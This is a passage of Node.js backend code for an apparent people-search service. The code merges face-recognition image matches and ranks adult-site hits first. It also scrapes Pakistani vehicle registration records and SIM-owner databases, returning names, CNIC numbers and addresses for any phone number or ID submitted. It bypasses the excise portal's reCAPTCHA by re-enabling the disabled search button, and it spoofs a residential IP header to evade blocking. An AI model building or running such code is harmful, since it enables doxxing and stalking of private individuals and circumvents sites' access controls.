    console.log(`Google Vision pages: ${visionPages.length} | exact: ${visionData.exact.length} | similar: ${visionData.similar.length}`);

    // 9. Vision similar images → shown in the "googleImageTiles" grid
    const backendBase = process.env.BACKEND_PUBLIC_URL || "http://localhost:5000";
    const visionSimilarTiles = visionData.similar.map((v) => {
      let source = "";
      try { source = new URL(v.url).hostname.replace(/^www\./, ""); } catch {}
      const proxied = `${backendBase}/image-proxy?url=${encodeURIComponent(v.url)}`;
      return {
        title: source, link: v.url, source,
        thumbnail: proxied, original: v.url,
        engine: "google_images", confidence: 70,
        category: categorizeDomain(v.url),
      };
    });

    // 10. Build name-based image matches from supplemental Google Images search
    const nameMatches = nameImageRaw.map((m, i) => {
      const link     = m.link || "";
      const original = m.original || "";
      let source = "";
      try { source = new URL(link || original).hostname.replace(/^www\./, ""); } catch {}
      return {
        title:      m.title || source,
        link:       link || original,
        source,
        thumbnail:  m.thumbnail || "",
        _verifyUrl: original || m.thumbnail || "",  // use full-size for face check
        engine:     "google_images",
        confidence: scoreByPosition(i + 1, nameImageRaw.length, "google"),
        category:   categorizeDomain(link || original),
      };
    });
    if (nameMatches.length) console.log(`Name search added ${nameMatches.length} additional results`);

    // 11. Merge visual matches - deduplicate by URL, highest confidence wins
    const seen = new Map();
    for (const m of [...faceMatches, ...visionMatches, ...yandexMatches, ...googleMatches, ...nameMatches]) {
      const key = m.link || m.title;
      if (!seen.has(key) || seen.get(key).confidence < m.confidence) {
        seen.set(key, m);
      }
    }

    let allMatches = [...seen.values()];

    // 12. Face verification - use _verifyUrl (full-size image) when available
    let faceVerifiedCount = 0;
    if (faceEmbedding) {
      // Deduplicate verify URLs - prefer _verifyUrl (full-size), fall back to thumbnail
      const seen = new Set();
      const candidateUrls = [];
      for (const m of allMatches) {
        const url = (m._verifyUrl && m._verifyUrl.startsWith("http")) ? m._verifyUrl
                  : (m.thumbnail && typeof m.thumbnail === "string" && m.thumbnail.startsWith("http")) ? m.thumbnail
                  : null;
        if (url && !seen.has(url)) { seen.add(url); candidateUrls.push(url); }
        if (candidateUrls.length >= 60) break;
      }

      console.log(`🔍 Running face verification on ${candidateUrls.length} candidates (full-size where available)...`);
      const verifyResults = await verifyFacesBatch(faceEmbedding, candidateUrls);
      const matchedUrls   = new Set(verifyResults.filter(r => r.match).map(r => r.url));
      const confidenceMap = Object.fromEntries(verifyResults.map(r => [r.url, r.confidence]));

      // Annotate every match - FaceCheck.id results are pre-verified by definition
      allMatches = allMatches.map(m => {
        const verifyUrl     = (m._verifyUrl?.startsWith("http")) ? m._verifyUrl : m.thumbnail;
        const isPreVerified = m.engine === "facecheck";
        const urlVerified   = matchedUrls.has(verifyUrl);
        const verified      = isPreVerified || urlVerified;
        const faceConf      = confidenceMap[verifyUrl] ?? (isPreVerified ? m.confidence : null);
        // strip internal field before sending to client
        const { _verifyUrl, ...rest } = m;
        return { ...rest, faceVerified: verified, faceConfidence: faceConf };
      });

      faceVerifiedCount = allMatches.filter(m => m.faceVerified).length;
      console.log(`✅ Face verification: ${faceVerifiedCount} confirmed (out of ${allMatches.length} total)`);
    } else {
      allMatches = allMatches.map(({ _verifyUrl, ...m }) => ({ ...m, faceVerified: false, faceConfidence: null }));
    }

    // Sort by composite relevance: face similarity > name match > engine confidence
    allMatches.sort((a, b) => {
      // Adult sites always float to very top regardless
      if (a.category === "adult" && b.category !== "adult") return -1;
      if (b.category === "adult" && a.category !== "adult") return  1;
      return computeRelevanceScore(b, personName) - computeRelevanceScore(a, personName);
    });

    // 13. Stats - always use full allMatches (no strict face filter)
    const finalMatches = allMatches;
    const stats = { total: finalMatches.length, social: 0, news: 0, adult: 0, unknown: 0 };
    for (const m of finalMatches) stats[m.category] = (stats[m.category] || 0) + 1;

    const bestLabel = visionData.bestLabel || kg.title || null;
    console.log(
      `✅ Merged: ${stats.total} unique | adult:${stats.adult} social:${stats.social}` +
      ` unknown:${stats.unknown} | lens:${googleMatches.length} yandex:${yandexMatches.length}` +
      ` vision:${visionMatches.length} face:${faceMatches.length} name:${nameMatches.length}` +
      ` faceVerified:${faceVerifiedCount}`
    );

    res.json({
      bestGuessLabel:    bestLabel,
      visualMatches:     finalMatches.slice(0, 80),
      googleImageTiles:  visionSimilarTiles.slice(0, 30),
      botMatches:        visionPages.slice(0, 20),
      faceVerificationUsed: !!faceEmbedding,
      faceVerifiedCount,
      stats,
      metadata,
    });
  } catch (err) {
    console.error("Image scan error:", err.message || err);
    if (fs.existsSync(tmpFile)) fs.unlinkSync(tmpFile);
    res.status(500).json({ error: err.message || "Image scan failed" });
  }
});

// -------------------- Pakistan Vehicle Plate Lookup --------------------

// ── Pakistan plate lookup ─────────────────────────────────────────────────────
const PK_CITY_MAP = {
  LEA:"Lahore",LEB:"Lahore",LEC:"Lahore",LED:"Lahore",LEE:"Lahore",
  LEF:"Lahore",LEG:"Lahore",LEH:"Lahore",LEJ:"Lahore",LEK:"Lahore",
  RWP:"Rawalpindi",RWA:"Rawalpindi",RWB:"Rawalpindi",
  FSD:"Faisalabad",FSA:"Faisalabad",FSB:"Faisalabad",
  MUL:"Multan",MUA:"Multan",GUJ:"Gujranwala",GJA:"Gujranwala",
  SKT:"Sialkot",SKA:"Sialkot",SHK:"Sheikhupura",BWP:"Bahawalpur",
  SRG:"Sargodha",DGK:"Dera Ghazi Khan",JHG:"Jhang",KSR:"Kasur",
  KBJ:"Kasur",KBA:"Kasur",KBB:"Kasur",KBC:"Kasur",KBD:"Kasur",
  MND:"Mandi Bahauddin",GWL:"Gujrat",NWS:"Narowal",CHW:"Chiniot",
  KHI:"Karachi",KAA:"Karachi",KAB:"Karachi",KAC:"Karachi",KAD:"Karachi",
  HYD:"Hyderabad",SKR:"Sukkur",
  PES:"Peshawar",PSH:"Peshawar",ABT:"Abbottabad",MRD:"Mardan",
  QTA:"Quetta",QAA:"Quetta",
  ISB:"Islamabad",ISA:"Islamabad",ISC:"Islamabad",
};

function getPkCity(plate) {
  const letters = plate.replace(/[^A-Z]/g, "");
  for (let len = Math.min(letters.length, 4); len >= 2; len--) {
    const key = letters.slice(0, len);
    if (PK_CITY_MAP[key]) return PK_CITY_MAP[key];
  }
  return null;
}

// Convert "KBJ3465" → "KBJ-3465"
function toDashed(plate) {
  return plate.replace(/^([A-Z]+)(\d+)$/, "$1-$2");
}

// Build standardised result object from excise.gos.pk data
function buildExciseResult(regNo, makeRaw, engineNoRaw, wheelers_type, detailPairs, originalPlate) {
  const yearMatch = makeRaw.match(/(\d{4})\s*$/);
  const year  = yearMatch ? yearMatch[1] : null;
  const make  = yearMatch ? makeRaw.slice(0, -4).trim() : makeRaw.trim();

  const find = (...keys) => {
    if (!detailPairs) return null;
    for (const k of keys) {
      const entry = Object.entries(detailPairs).find(([lbl]) =>
        lbl.toLowerCase().includes(k.toLowerCase())
      );
      if (entry && entry[1].trim()) return entry[1].trim();
    }
    return null;
  };

  return {
    found:            true,
    plate:            regNo || originalPlate,
    country:          "PK",
    city:             getPkCity(originalPlate),
    make:             make  || null,
    model:            make  || null,         // make includes model for Pakistani plates
    year,
    color:            find("colour","color") || null,
    fuelType:         find("fuel")           || "Petrol",
    vehicleType:      wheelers_type === "2"
                        ? "Motorcycle / Two-Wheeler"
                        : "Car / Four-Wheeler",
    transmission:     find("transmission")  || null,
    driveType:        null,
    vin:              find("chassis")        || null,
    engineSize:       find("engine capacity","cc","displacement") || null,
    engineNo:         engineNoRaw || find("engine no","engine number") || null,
    owner:            find("owner","registered owner","name") || null,
    registrationDate: find("registration date","reg date")    || null,
    tokenTax:         find("token","annual tax","tax")        || null,
    condition:        null,
    source:           "Sindh Excise (excise.gos.pk)",
  };
}

// ── Strategy 1: direct POST (works when server doesn't re-validate reCAPTCHA) ──
async function tryExciseGOSDirect(plate) {
  const SEARCH = "https://www.excise.gos.pk/vehicle/vehicle_search";
  const RESULT = "https://www.excise.gos.pk/vehicle/vehicle_result";

  let cookies = "";
  try {
    const home = await axios.get(SEARCH, {
      headers: { "User-Agent": UA, "Accept": "text/html,*/*" },
      timeout: 12000,
    });
    cookies = (home.headers["set-cookie"] || []).map(c => c.split(";")[0]).join("; ");
  } catch (_) {}

  const dashed = toDashed(plate);

  for (const wheelers_type of ["2", "1"]) {
    for (const reg_no of [dashed, plate]) {
      try {
        const resp = await axios.post(
          RESULT,
          new URLSearchParams({ reg_no, wheelers_type }).toString(),
          {
            headers: {
              "Content-Type": "application/x-www-form-urlencoded",
              "User-Agent": UA,
              "Cookie": cookies,
              "Referer": SEARCH,
              "Origin": "https://www.excise.gos.pk",
            },
            timeout: 15000,
          }
        );

        const html = resp.data || "";
        // Look for a result row: <td>KBJ-3465</td><td>SUPER STAR 70 2005</td><td>127635</td>
        const rowRe = /<tr[\s\S]*?<td>\s*([\w\-]+)\s*<\/td>\s*<td>([\s\S]*?)<\/td>\s*<td>([\s\S]*?)<\/td>/i;
        const m = html.match(rowRe);
        if (!m) continue;

        const regNo    = m[1].trim();
        const makeRaw  = m[2].replace(/<[^>]+>/g, "").trim();
        const engineNo = m[3].replace(/<[^>]+>/g, "").trim();
        if (!makeRaw) continue;

        console.log(`✅ Excise GOS direct hit: ${regNo} → ${makeRaw}`);
        return buildExciseResult(regNo, makeRaw, engineNo, wheelers_type, null, plate);
      } catch (_) {}
    }
  }
  return null;
}

// ── Strategy 2: Puppeteer - removes `disabled` from button to bypass reCAPTCHA ─
async function tryExciseGOSPuppeteer(plate) {
  const BASE   = "https://www.excise.gos.pk";
  const dashed = toDashed(plate);
  let browser;

  try {
    browser = await puppeteer.launch({
      headless: "new",
      args: ["--no-sandbox","--disable-setuid-sandbox","--disable-dev-shm-usage",
             "--disable-blink-features=AutomationControlled"],
    });
    const page = await browser.newPage();
    page.setDefaultNavigationTimeout(30000);

    await page.goto(`${BASE}/vehicle/vehicle_search`, { waitUntil: "domcontentloaded" });
    await page.waitForSelector("#reg_no", { timeout: 10000 });

    for (const wheelers_type of ["2", "1"]) {
      // Select vehicle type via radio button
      await page.evaluate((wt) => {
        document.querySelectorAll('input[name="wheelers_type"]').forEach(r => {
          r.checked = (r.value === wt);
        });
      }, wheelers_type);

      // Type plate number (dashed format)
      await page.$eval("#reg_no", el => { el.value = ""; });
      await page.type("#reg_no", dashed, { delay: 40 });

      // *** Bypass reCAPTCHA: remove the disabled attribute the reCAPTCHA callback sets ***
      await page.evaluate(() => {
        const btn = document.getElementById("search_veh");
        if (btn) {
          btn.removeAttribute("disabled");
          btn.disabled = false;
        }
      });

      // Click search - this fires the AJAX call
      await page.click("#search_veh");

      // Wait for AJAX result to appear in #veh_res tbody
      const gotResults = await page.waitForFunction(
        () => {
          const tbody = document.querySelector("#veh_res tbody");
          return tbody && [...tbody.querySelectorAll("tr")].some(r => r.querySelector("td"));
        },
        { timeout: 15000 }
      ).then(() => true).catch(() => false);

      if (!gotResults) continue;

      // Scrape the list row
      const listData = await page.evaluate(() => {
        const rows = [...document.querySelectorAll("#veh_res tbody tr")]
          .filter(r => r.querySelector("td"));
        if (!rows.length) return null;
        const cells = rows[0].querySelectorAll("td");
        const viewBtn  = rows[0].querySelector(".single_vehicle_view");
        const tokenEl  = document.getElementById("_SITE_TOKEN");
        return {
          regNo:    cells[0]?.innerText?.trim(),
          make:     cells[1]?.innerText?.trim(),
          engineNo: cells[2]?.innerText?.trim(),
          regNumber: viewBtn?.getAttribute("registration_number"),
          siteToken: tokenEl?.value,
        };
      });

      if (!listData?.make) continue;
      console.log(`✅ Excise GOS Puppeteer list hit: ${listData.regNo} → ${listData.make}`);

      // Click "View Details" to get full record
      let detailPairs = null;
      try {
        await page.click(".single_vehicle_view");

        // Wait for either detail div to become visible with real content
        await page.waitForFunction(() => {
          const ids = ["veh_res1", "veh_number_plate_res"];
          return ids.some(id => {
            const el = document.getElementById(id);
            return el && el.style.display !== "none" && el.innerText.trim().length > 30;
          });
        }, { timeout: 12000 });

        detailPairs = await page.evaluate(() => {
          const pairs = {};
          ["veh_res1", "veh_number_plate_res"].forEach(id => {
            const el = document.getElementById(id);
            if (!el) return;
            el.querySelectorAll("tr").forEach(row => {
              const cells = row.querySelectorAll("td,th");
              if (cells.length >= 2) {
                const k = cells[0].innerText.trim().replace(/\s*:$/, "");
                const v = cells[1].innerText.trim();
                if (k && v && k.length < 80) pairs[k] = v;
              }
            });
            // also label→sibling pattern
            el.querySelectorAll("[class*='label'],th,b,strong").forEach(lbl => {
              const sib = lbl.nextElementSibling || lbl.parentElement?.nextElementSibling;
              if (sib) {
                const k = lbl.innerText.trim().replace(/\s*:$/, "");
                const v = sib.innerText.trim();
                if (k && v && k.length < 80 && !pairs[k]) pairs[k] = v;
              }
            });
          });
          return pairs;
        });
        console.log(`✅ Detail view scraped: ${Object.keys(detailPairs || {}).length} fields`);
      } catch (e) {
        console.warn("View Details click failed:", e.message);
      }

      return buildExciseResult(
        listData.regNo, listData.make, listData.engineNo,
        wheelers_type, detailPairs, plate
      );
    }
    return null;
  } catch (e) {
    console.warn("Excise GOS Puppeteer error:", e.message);
    return null;
  } finally {
    if (browser) await browser.close().catch(() => {});
  }
}

async function lookupPakistanPlate(plate) {
  console.log(`🔍 PK plate lookup: ${plate} (${getPkCity(plate) || "unknown city"})`);

  // Strategy 1: fast direct POST (no browser spin-up)
  const direct = await tryExciseGOSDirect(plate);
  if (direct) return direct;

  // Strategy 2: headless Puppeteer with reCAPTCHA bypass
  const puppeteerResult = await tryExciseGOSPuppeteer(plate);
  if (puppeteerResult) return puppeteerResult;

  return {
    found:   false,
    plate,
    country: "PK",
    city:    getPkCity(plate) || null,
  };
}

app.get("/scan-plate", async (req, res) => {
  const { plate } = req.query;
  if (!plate || typeof plate !== "string" || plate.trim().length < 2) {
    return res.status(400).json({ error: "A valid plate number is required" });
  }

  // Normalize - strip spaces and dashes; toDashed() re-adds the dash for the portal
  const clean = plate.trim().toUpperCase().replace(/[\s\-]/g, "");

  try {
    const result = await lookupPakistanPlate(clean);
    return res.json(result);
  } catch (err) {
    console.error("Plate scan error:", err.message);
    res.status(500).json({ error: "Plate lookup failed. Try again." });
  }
});

// ─────────────────────────────────────────────────────────────────────────────
// simowner.net.pk lookup - direct API (GET /ajax-handler.php?number=03XXXXXXXXX)
// Response: [{ Name, CNIC, Mobile, ADDRESS }]
// ─────────────────────────────────────────────────────────────────────────────

// Shared headers for simowner.net.pk - spoof Pakistani residential IP via X-Forwarded-For
// because Render's datacenter IP gets blocked by the site
const SIMOWNER_HEADERS = {
  "Accept":           "application/json, text/javascript, */*; q=0.01",
  "Accept-Language":  "en-US,en;q=0.9",
  "Referer":          "https://simowner.net.pk/",
  "Origin":           "https://simowner.net.pk",
  "User-Agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
  "X-Requested-With": "XMLHttpRequest",
  "X-Forwarded-For":  "39.35.12.108",   // Pakistani residential IP (Zong range)
  "sec-fetch-dest":   "empty",
  "sec-fetch-mode":   "cors",
  "sec-fetch-site":   "same-origin",
};

async function scrapeSimOwner(phone) {
  let digits = phone.replace(/\D/g, "");
  if (digits.startsWith("92")) digits = "0" + digits.slice(2);
  if (!digits.startsWith("0"))  digits = "0" + digits;
  if (digits.length !== 11) return null;

  try {
    const workerUrl = process.env.SIMOWNER_WORKER_URL;
    const fetchUrl = workerUrl
      ? `${workerUrl}?number=${digits}`
      : `https://simowner.net.pk/ajax-handler.php?number=${digits}`;

    const resp = await axios.get(fetchUrl, {
      headers: SIMOWNER_HEADERS,
      timeout: 30000,
      validateStatus: () => true,
    });

    if (resp.status !== 200) {
      console.warn(`SimOwner returned HTTP ${resp.status} for phone ${digits}`);
      return null;
    }

    const rows = Array.isArray(resp.data) ? resp.data : [resp.data];
    const row  = rows[0];
    if (!row || !row.Name) {
      console.warn(`SimOwner: no Name in response for ${digits}:`, JSON.stringify(resp.data).slice(0, 200));
      return null;
    }

    const rawCnic = String(row.CNIC || "").replace(/\D/g, "");
    let cnicFormatted = null;
    let cnicMasked    = null;
    if (rawCnic.length === 13) {
      cnicFormatted = `${rawCnic.slice(0,5)}-${rawCnic.slice(5,12)}-${rawCnic.slice(12)}`;
    }

    return {
      name:         row.Name    || null,
      cnic:         cnicFormatted || rawCnic || null,
      address:      row.ADDRESS || null,
      source:       "simowner.net.pk",
      dataNote:     "Public database - records up to 2022",
    };
  } catch (err) {
    console.error("SimOwner error:", err.message);
    return null;
  }
}


// ─────────────────────────────────────────────────────────────────────────────
// Phone Number Risk Assessment
// GET /scan-phone?phone=03001234567&country=PK
// ─────────────────────────────────────────────────────────────────────────────

const PK_MOBILE_PREFIXES = {
  "300":"Jazz","301":"Jazz","302":"Jazz","303":"Jazz","304":"Jazz",
  "305":"Jazz","306":"Jazz","307":"Jazz","308":"Jazz","309":"Jazz",
  "310":"Zong","311":"Zong","312":"Zong","313":"Zong","314":"Zong",
  "315":"Zong","316":"Zong","317":"Zong","318":"Zong","319":"Zong",
  "320":"Jazz","321":"Jazz","322":"Jazz","323":"Jazz","324":"Jazz","325":"Jazz",
  "330":"Ufone","331":"Ufone","332":"Ufone","333":"Ufone","334":"Ufone",
  "335":"Ufone","336":"Ufone","337":"Ufone","338":"Ufone","339":"Ufone",
  "340":"Telenor","341":"Telenor","342":"Telenor","343":"Telenor","344":"Telenor",
  "345":"Telenor","346":"Telenor","347":"Telenor","348":"Telenor","349":"Telenor",
  "350":"Zong","351":"Zong","352":"Zong","353":"Zong","354":"Zong",
  "360":"Zong","361":"Zong","362":"Zong","363":"Zong",
  "370":"Zong","374":"Zong","380":"Zong",
};

const PK_LANDLINE_AREAS = {
  "21":{ city:"Karachi",       province:"Sindh" },
  "22":{ city:"Hyderabad",     province:"Sindh" },
  "221":{ city:"Sukkur",       province:"Sindh" },
  "222":{ city:"Larkana",      province:"Sindh" },
  "241":{ city:"Faisalabad",   province:"Punjab" },
  "42":{ city:"Lahore",        province:"Punjab" },
  "423":{ city:"Sheikhupura",  province:"Punjab" },
  "51":{ city:"Islamabad / Rawalpindi", province:"Punjab / ICT" },
  "52":{ city:"Sialkot",       province:"Punjab" },
  "53":{ city:"Gujrat",        province:"Punjab" },
  "55":{ city:"Gujranwala",    province:"Punjab" },
  "56":{ city:"Hafizabad",     province:"Punjab" },
  "61":{ city:"Multan",        province:"Punjab" },
  "62":{ city:"Bahawalpur",    province:"Punjab" },
  "64":{ city:"Rahim Yar Khan",province:"Punjab" },
  "65":{ city:"Sahiwal",       province:"Punjab" },
  "66":{ city:"Okara",         province:"Punjab" },
  "68":{ city:"Sahiwal",       province:"Punjab" },
  "71":{ city:"Sukkur",        province:"Sindh" },
  "74":{ city:"Mirpur Khas",   province:"Sindh" },
  "76":{ city:"Jacobabad",     province:"Sindh" },
  "81":{ city:"Quetta",        province:"Balochistan" },
  "82":{ city:"Turbat",        province:"Balochistan" },
  "86":{ city:"Dera Ismail Khan", province:"KPK" },
  "91":{ city:"Peshawar",      province:"KPK" },
  "92":{ city:"Mardan",        province:"KPK" },
  "93":{ city:"Mingora / Swat",province:"KPK" },
  "94":{ city:"Abbottabad",    province:"KPK" },
  "995":{ city:"Muzaffarabad", province:"AJK" },
};

const COUNTRY_META = {
  PK:{ name:"Pakistan",  flag:"🇵🇰", carriers:["Jazz","Zong","Telenor","Ufone","PTCL"], mobileLen:10 },
  IN:{ name:"India",     flag:"🇮🇳", carriers:["Jio","Airtel","Vi","BSNL"],             mobileLen:10 },
  AE:{ name:"UAE",       flag:"🇦🇪", carriers:["Etisalat (e&)","du"],                   mobileLen:9  },
  SA:{ name:"Saudi Arabia",flag:"🇸🇦",carriers:["STC","Mobily","Zain"],                mobileLen:9  },
  BD:{ name:"Bangladesh",flag:"🇧🇩", carriers:["Grameenphone","Robi","BL","Teletalk"],  mobileLen:10 },
  GB:{ name:"UK",        flag:"🇬🇧", carriers:["EE","O2","Vodafone","Three"],           mobileLen:10 },
  US:{ name:"USA",       flag:"🇺🇸", carriers:["AT&T","Verizon","T-Mobile"],            mobileLen:10 },
  CA:{ name:"Canada",    flag:"🇨🇦", carriers:["Bell","Rogers","Telus"],                mobileLen:10 },
  AU:{ name:"Australia", flag:"🇦🇺", carriers:["Telstra","Optus","Vodafone AU"],        mobileLen:9  },
  DE:{ name:"Germany",   flag:"🇩🇪", carriers:["Deutsche Telekom","Vodafone DE","O2"],  mobileLen:10 },
  FR:{ name:"France",    flag:"🇫🇷", carriers:["Orange","SFR","Bouygues","Free"],       mobileLen:9  },
  JP:{ name:"Japan",     flag:"🇯🇵", carriers:["NTT Docomo","SoftBank","au"],           mobileLen:10 },
};

function analyzePakistanPhone(rawDigits) {
  let d = rawDigits;
  if (d.startsWith("92")) d = d.slice(2);
  if (d.startsWith("0"))  d = d.slice(1);

  // Mobile: starts with 3, total 10 digits
  if (d.startsWith("3") && d.length === 10) {
    const prefix  = d.slice(0, 3);
    const carrier = PK_MOBILE_PREFIXES[prefix];
    return {
      valid:       !!carrier,
      type:        "Mobile",
      carrier:     carrier || "Unknown carrier",
      city:        null,
      province:    null,
      localFormat: `0${d.slice(0,3)}-${d.slice(3,7)}-${d.slice(7)}`,
      intlFormat:  `+92 ${d.slice(0,3)} ${d.slice(3,7)} ${d.slice(7)}`,
    };
  }

  // Landline: try 3-digit area code, then 2-digit
  for (const len of [3, 2]) {
    const code = d.slice(0, len);
    const area  = PK_LANDLINE_AREAS[code];
    if (area) {
      return {
        valid:       true,
        type:        "Landline",
        carrier:     "PTCL",
        city:        area.city,
        province:    area.province,
        localFormat: `0${code}-${d.slice(len)}`,
        intlFormat:  `+92 ${code} ${d.slice(len)}`,
      };
    }
  }

  return { valid:false, type:"Unknown", carrier:null, city:null, province:null, localFormat:null, intlFormat:null };
}

app.get("/scan-phone", async (req, res) => {
  const { phone, country } = req.query;
  if (!phone) return res.status(400).json({ error: "Phone number is required" });

  const rawDigits = String(phone).replace(/\D/g, "");
  const cc        = (country || "US").toUpperCase();
  const meta      = COUNTRY_META[cc] || COUNTRY_META["US"];

  let parsed = { valid: false, type: "Unknown", carrier: null, city: null, province: null, localFormat: null, intlFormat: null };

  if (cc === "PK" || rawDigits.startsWith("92")) {
    parsed = analyzePakistanPhone(rawDigits);
  } else {
    const stripped = rawDigits.startsWith("1") && cc === "US" ? rawDigits.slice(1) : rawDigits;
    const isValidLength = stripped.length >= 7 && stripped.length <= 12;
    parsed.valid       = isValidLength;
    parsed.type        = "Mobile";
    parsed.localFormat = rawDigits;
    parsed.intlFormat  = `+${rawDigits}`;
  }

  // Build risk factors
  const riskFactors = [];
  let riskScore = 15;

  if (parsed.valid) {
    if (parsed.type === "Mobile") {
      riskScore += 20;
      riskFactors.push({
        factor: "Mobile number",
        detail: "Mobile numbers are personally identifiable and tied to SIM registration records",
        severity: "medium",
      });
    }
    if (parsed.carrier) {
      riskScore += 10;
      riskFactors.push({
        factor: `Carrier identified: ${parsed.carrier}`,
        detail: "Knowing the carrier enables targeted SIM swap attacks and operator-specific phishing",
        severity: "low",
      });
    }
    if (parsed.city) {
      riskScore += 15;
      riskFactors.push({
        factor: `Location identified: ${parsed.city}`,
        detail: "Area code reveals physical city, useful for social engineering and targeted scams",
        severity: "medium",
      });
    }
    if (cc === "PK" && parsed.type === "Mobile") {
      riskScore += 20;
      riskFactors.push({
        factor: "CNIC-linked SIM (Pakistan)",
        detail: "All Pakistani SIMs are biometrically registered against the CNIC - your number is directly tied to your national identity card",
        severity: "high",
      });
    }
    if (parsed.type === "Mobile") {
      riskScore += 10;
      riskFactors.push({
        factor: "SMS-based 2FA target",
        detail: "Mobile numbers used for OTP/2FA are a primary target for SIM swap and SS7 interception attacks",
        severity: "medium",
      });
    }
    if (!parsed.valid) {
      riskScore = 5;
    }
  }

  // Country-specific recommendations
  const recommendations = [];
  if (cc === "PK") {
    recommendations.push(
      { text: "Check your SIM registration at cmla.gov.pk - verify how many SIMs are registered against your CNIC", priority: "high" },
      { text: "Enable SIM lock / port-freeze by contacting your carrier (Jazz/Zong/Telenor/Ufone)", priority: "high" },
      { text: "Never share your CNIC number with strangers - it can be used to register new SIMs in your name", priority: "high" },
      { text: "Use an authenticator app (Google/Microsoft Authenticator) instead of SMS OTP for accounts", priority: "medium" },
      { text: "Register your number on the National Do Not Call Registry if available", priority: "low" },
    );
  } else {
    recommendations.push(
      { text: "Enable SIM lock / number port freeze with your carrier to prevent SIM swap attacks", priority: "high" },
      { text: "Replace SMS-based 2FA with an authenticator app wherever possible", priority: "high" },
      { text: "Use a secondary number (Google Voice / virtual SIM) for online signups", priority: "medium" },
      { text: "Request removal from data broker sites (Spokeo, WhitePages, BeenVerified)", priority: "medium" },
      { text: "Enable call screening to filter spam robocalls", priority: "low" },
    );
  }

  // For Pakistani mobile numbers, run the simowner.net.pk scrape in parallel
  let simOwnerData = null;
  if (cc === "PK" && parsed.type === "Mobile") {
    console.log(`📱 SimOwner scrape starting for ${rawDigits}…`);
    simOwnerData = await scrapeSimOwner(rawDigits).catch(e => {
      console.warn("SimOwner scrape failed:", e.message);
      return null;
    });
    if (simOwnerData) {
      // Bump risk score - actual owner data found in public database
      riskScore = Math.min(riskScore + 20, 95);
      riskFactors.unshift({
        factor: "Owner details found in public database",
        detail: `Name and partial CNIC were retrieved from simowner.net.pk - a publicly accessible database. Anyone can look this up.`,
        severity: "high",
      });
    }
  }

  return res.json({
    valid:           parsed.valid,
    phone:           rawDigits,
    country:         cc,
    countryName:     meta.name,
    countryFlag:     meta.flag,
    type:            parsed.type,
    carrier:         parsed.carrier,
    city:            parsed.city,
    province:        parsed.province,
    localFormat:     parsed.localFormat,
    intlFormat:      parsed.intlFormat,
    riskScore:       Math.min(riskScore, 95),
    riskFactors,
    recommendations,
    simOwnerData,    // null if not PK mobile or scrape failed
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// CNIC Lookup - SIMs registered to a Pakistani CNIC
// GET /scan-cnic?cnic=4220104950125
// ─────────────────────────────────────────────────────────────────────────────
app.get("/scan-cnic", async (req, res) => {
  const raw = (req.query.cnic || "").toString().replace(/\D/g, "");
  if (raw.length !== 13) {
    return res.status(400).json({ error: "CNIC must be exactly 13 digits." });
  }

  const cnicFormatted = `${raw.slice(0,5)}-${raw.slice(5,12)}-${raw.slice(12)}`;

  try {
    const workerUrl = process.env.SIMOWNER_WORKER_URL;
    const fetchUrl = workerUrl
      ? `${workerUrl}?number=${raw}`
      : `https://simowner.net.pk/ajax-handler.php?number=${raw}`;

    const resp = await axios.get(fetchUrl, {
      headers: SIMOWNER_HEADERS,
      timeout: 30000,
      validateStatus: () => true,
    });

    if (resp.status !== 200) {
      console.warn(`SimOwner CNIC returned HTTP ${resp.status} for ${raw}`);
      return res.json({ cnic: cnicFormatted, found: false, sims: [], source: "simowner.net.pk", dataNote: "Public database - records up to 2022" });
    }

    const rows = Array.isArray(resp.data) ? resp.data : (resp.data ? [resp.data] : []);

    if (!rows.length || !rows[0]?.Name) {
      console.warn(`SimOwner CNIC: no data for ${raw}:`, JSON.stringify(resp.data).slice(0, 200));
      return res.json({ cnic: cnicFormatted, found: false, sims: [], source: "simowner.net.pk", dataNote: "Public database - records up to 2022" });
    }

    const sims = rows.map(row => {
      const mobile = String(row.Mobile || "").replace(/\D/g, "");
      let carrier = null;
      if (mobile.length >= 3) {
        const prefix = mobile.startsWith("92") ? mobile.slice(2, 5) : mobile.startsWith("0") ? mobile.slice(1, 4) : mobile.slice(0, 3);
        carrier = PK_MOBILE_PREFIXES[prefix] || null;
      }
      const localNumber = mobile.startsWith("92") ? "0" + mobile.slice(2) : mobile.startsWith("0") ? mobile : "0" + mobile;
      return {
        name:        row.Name    || null,
        mobile:      localNumber || null,
        carrier,
        address:     row.ADDRESS || null,
      };
    });

    const ownerName = rows[0].Name || null;

    return res.json({
      cnic:      cnicFormatted,
      found:     true,
      ownerName,
      simCount:  sims.length,
      sims,
      source:    "simowner.net.pk",
      dataNote:  "Public database - records up to 2022",
    });
  } catch (err) {
    console.error("CNIC lookup error:", err.message);
    return res.status(502).json({ error: "Could not reach simowner.net.pk. Try again shortly." });
  }
});

// Force IPv4 for leakcheck.io — WSL2 has broken IPv6 routing to Cloudflare IPs
const leakcheckAgent = new https.Agent({ family: 4, keepAlive: false });
const leakcheckGet = (url, opts = {}) =>
  axios.get(url, { ...opts, httpsAgent: leakcheckAgent, timeout: opts.timeout || 15000 });

// Known breach metadata for enriching LeakCheck results
const BREACH_META = {
  linkedin: { domain: "linkedin.com", records: 700000000 },
  linkedinscrape2021: { domain: "linkedin.com", records: 700000000 },
  adobe: { domain: "adobe.com", records: 153000000 },
  dropbox: { domain: "dropbox.com", records: 68648009 },
  myfitnesspal: { domain: "myfitnesspal.com", records: 143606147 },
  canva: { domain: "canva.com", records: 137000000 },
  twitter: { domain: "twitter.com", records: 229000000 },
  yahoo: { domain: "yahoo.com", records: 3000000000 },
  yahoo2013: { domain: "yahoo.com", records: 3000000000 },
  yahoo2014: { domain: "yahoo.com", records: 500000000 },
  facebook: { domain: "facebook.com", records: 533000000 },
  instagram: { domain: "instagram.com", records: 49000000 },
  rockyou: { domain: "rockyou.com", records: 32603388 },
  rockyou2021: { domain: "rockyou.com", records: 8400000000 },
  "000webhost": { domain: "000webhost.com", records: 15251512 },
  apollo: { domain: "apollo.io", records: 125929660 },
  collection1: { domain: null, records: 772904991 },
  twitch: { domain: "twitch.tv", records: 125000000 },
  reddit: { domain: "reddit.com", records: 161549597 },
  tumblr: { domain: "tumblr.com", records: 65469298 },
  lastfm: { domain: "last.fm", records: 43570999 },
  "last.fm": { domain: "last.fm", records: 43570999 },
  ebay: { domain: "ebay.com", records: 145000000 },
  quora: { domain: "quora.com", records: 100000000 },
